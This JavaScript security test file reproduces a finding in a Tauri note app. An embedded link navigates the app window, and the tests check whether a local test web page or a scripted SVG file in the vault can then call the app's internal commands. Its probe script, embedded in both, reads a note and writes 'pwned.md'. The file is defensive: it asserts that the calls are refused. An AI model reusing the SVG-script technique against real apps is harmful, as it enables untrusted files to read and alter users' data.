// Reproduction for FINDING-007 (external link inside a Live Preview embed
// navigates the app window), see also adv_verify_ed_22.test.mjs. These
// cases check how much harm the navigation does:
//
//  1. Realistic timing: a user types, then takes ~1 s to reach the mouse and
//     click. Is the edit still lost, or only edits inside the 600 ms window?
//  2. Remote page: after the window navigates to a non-app http page, can that
//     page's own script reach the Tauri IPC (app commands)?
//  3. vault:// page: the same click path with a link to an SVG file in the
//     vault. vault:// is a registered custom scheme, which Tauri treats as a
//     *local* origin. Does the SVG's script get the IPC?
//
// Run:  scripts/e2e-headless.sh e2e/adv_verify_ed_22_02.test.mjs

import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { withApp, sleep, eventually } from "./adv_editor_lib.mjs";

const LINK = ".cm-lp-embed .embed-body a";

async function whereAmI(app) {
  try {
    return await app.exec(`return { href: location.href, workspace: !!document.querySelector('.workspace'), title: document.title }`);
  } catch (e) {
    return { error: String(e.message).slice(0, 200) };
  }
}

async function realClick(app, css) {
  await app.s.waitFor(`return !!document.querySelector(${JSON.stringify(css)})`, { message: css, timeout: 8000 });
  const c = await app.center(css);
  await app.clickAt(c.x, c.y);
}

// Script the attacker's page runs. Harmless commands only (no open_url, no
// dialogs): platform, read_note, create_note in the temp vault.
const PROBE_JS = `
window.__probe = { internals: typeof window.__TAURI_INTERNALS__, results: {}, done: false };
(async () => {
  const I = window.__TAURI_INTERNALS__;
  if (I && I.invoke) {
    for (const [cmd, args] of [
      ['platform', {}],
      ['read_note', { path: 'Host.md' }],
      ['create_note', { path: 'pwned.md', content: 'written by a page loaded into the app window' }],
    ]) {
      try { const r = await I.invoke(cmd, args); window.__probe.results[cmd] = { ok: JSON.stringify(r).slice(0, 160) }; }
      catch (e) { window.__probe.results[cmd] = { err: String(e && (e.message || e)).slice(0, 300) }; }
    }
  }
  window.__probe.done = true;
})();
`;

test(
  "FINDING-007: realistic pause (1 s) between typing and clicking the embed link: window still navigates, but is the edit saved?",
  async () => {
    await withApp(
      { "Host.md": "top line\n\n![[Inner]]\n\nend\n", "Inner.md": "Inner says: [example](https://example.com/from-embed)\n" },
      async (app, env) => {
        await app.open("Host.md");
        await app.fakeFocus();
        await app.focusEnd();
        await app.keys("typed");
        await sleep(1000); // hand moves from keyboard to mouse
        const stateBefore = await app.saveState();
        await realClick(app, LINK);
        await sleep(1500);
        const after = await whereAmI(app);
        const disk = env.vault.read("Host.md");
        console.log(`1 s pause: save state before click ${JSON.stringify(stateBefore)}; window after ${JSON.stringify(after)}; typed text on disk: ${disk.includes("typed")}`);
        assert.ok(after.workspace, `window navigated to ${after.href}; typed text on disk: ${disk.includes("typed")}`);
      },
    );
  },
);

test(
  "FINDING-007: a remote http page loaded into the app window by the embed link cannot call app commands",
  async () => {
    const server = http.createServer((req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(`<!doctype html><title>remote probe</title><p>remote probe</p><script>${PROBE_JS}</script>`);
    });
    await new Promise((r) => server.listen(0, "127.0.0.1", r));
    const url = `http://127.0.0.1:${server.address().port}/probe.html`;
    try {
      await withApp(
        { "Host.md": "top line\n\n![[Inner]]\n\nend\n", "Inner.md": `Inner says: [site](${url})\n` },
        async (app, env) => {
          await app.open("Host.md");
          await app.fakeFocus();
          await realClick(app, LINK);
          await sleep(1500);
          // The window should stay on the app so the page never loads (see
          // FINDING-007); if it does load, its calls must be refused.
          let probe = null;
          if (!(await whereAmI(app)).workspace) {
            await eventually(async () => (await app.exec(`return !!(window.__probe && window.__probe.done)`).catch(() => false)), { timeout: 8000, message: "probe page ran" });
            probe = await app.exec(`return window.__probe`);
          }
          const where = await whereAmI(app);
          const pwned = env.vault.exists("pwned.md");
          console.log(`remote page: window ${JSON.stringify(where)}; probe ${JSON.stringify(probe)}; pwned.md created: ${pwned}`);
          assert.equal(pwned, false, "remote page created a file in the vault");
          for (const [cmd, r] of Object.entries(probe?.results ?? {})) assert.ok(r.err, `remote page could call ${cmd}: ${JSON.stringify(r)}`);
        },
      );
    } finally {
      server.close();
    }
  },
);

test(
  "FINDING-007: an embed link to vault://localhost/<file>.svg loads the SVG as the app's top page; its script gets the IPC as a local origin",
  async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="300" height="60"><text x="10" y="35">svg probe</text><script><![CDATA[${PROBE_JS}]]></script></svg>`;
    await withApp(
      {
        "Host.md": "top line\n\n![[Inner]]\n\nend\n",
        "Inner.md": "Inner says: [diagram](vault://localhost/att/diagram.svg)\n",
        "att/diagram.svg": svg,
      },
      async (app, env) => {
        await app.open("Host.md");
        await app.fakeFocus();
        await realClick(app, LINK);
        let probe = null;
        try {
          await eventually(async () => (await app.exec(`return !!(window.__probe && window.__probe.done)`).catch(() => false)), { timeout: 8000, message: "svg probe ran" });
          probe = await app.exec(`return window.__probe`);
        } catch (e) {
          probe = { error: String(e.message).slice(0, 300) };
        }
        const where = await whereAmI(app);
        await sleep(500);
        const pwned = env.vault.exists("pwned.md");
        console.log(`vault:// svg: window ${JSON.stringify(where)}; probe ${JSON.stringify(probe)}; pwned.md created: ${pwned}${pwned ? " content " + JSON.stringify(env.vault.read("pwned.md")) : ""}`);
        assert.equal(pwned, false, `a script in a vault SVG, reached through the embed link, created pwned.md through the IPC; probe ${JSON.stringify(probe)}`);
        assert.ok(where.workspace, `window navigated to ${where.href}`);
      },
    );
  },
);
